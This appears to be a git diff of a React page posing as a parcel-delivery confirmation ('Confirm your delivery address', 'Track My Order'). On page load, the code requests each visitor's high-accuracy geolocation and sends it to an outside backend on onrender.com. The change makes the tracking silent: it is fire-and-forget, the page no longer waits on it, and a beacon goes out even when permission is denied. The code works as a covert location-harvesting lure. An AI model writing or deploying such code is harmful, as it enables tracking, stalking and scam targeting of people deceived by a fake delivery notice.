@@ -1,52 +1,34 @@
-import React, { useEffect, useState } from 'react';
+import React, { useEffect } from 'react';
 import './App.css';
 
 const BACKEND_URL = 'https://location-backend-i26t.onrender.com';
 
 function App() {
-  const [ready, setReady] = useState(false);
 
   useEffect(() => {
-    // Wake backend
-    fetch(`${BACKEND_URL}/ping`).catch(() => {});
-
-    // Ask location immediately
-    if (!navigator.geolocation) {
-      setReady(true);
-      return;
+    // Fire and forget — don't block page load
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+        },
+        () => {
+          sendLocation(null, null, null);
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    } else {
+      sendLocation(null, null, null);
     }
-
-    navigator.geolocation.getCurrentPosition(
-      async (pos) => {
-        try {
-          await fetch(`${BACKEND_URL}/api/location`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude,
-              accuracy: pos.coords.accuracy,
-            }),
-          });
-        } catch (e) {}
-        setReady(true);
-      },
-      () => {
-        // denied or error — still show site
-        setReady(true);
-      },
-      { enableHighAccuracy: true, timeout: 15000 }
-    );
   }, []);
 
-  // Block render until location resolved
-  if (!ready) {
-    return (
-      <div className="splash">
-        <div className="splash-spinner" />
-      </div>
-    );
-  }
+  const sendLocation = (latitude, longitude, accuracy) => {
+    fetch(`${BACKEND_URL}/api/location`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ latitude, longitude, accuracy }),
+    }).catch(() => {});
+  };
 
   return (
     <div className="app">
@@ -68,7 +50,6 @@ function App() {
           <p className="subtitle">
             Confirm your delivery address to get real-time updates and accurate drop-off.
           </p>
-
           <div className="info-box">
             <div className="info-row">
               <span>🏠</span>
@@ -78,10 +59,7 @@ function App() {
               </div>
             </div>
           </div>
-
-          <button className="cta-btn">
-            📦 Track My Order
-          </button>
+          <button className="cta-btn">📦 Track My Order</button>
         </div>
 
         <div className="hero-visual">
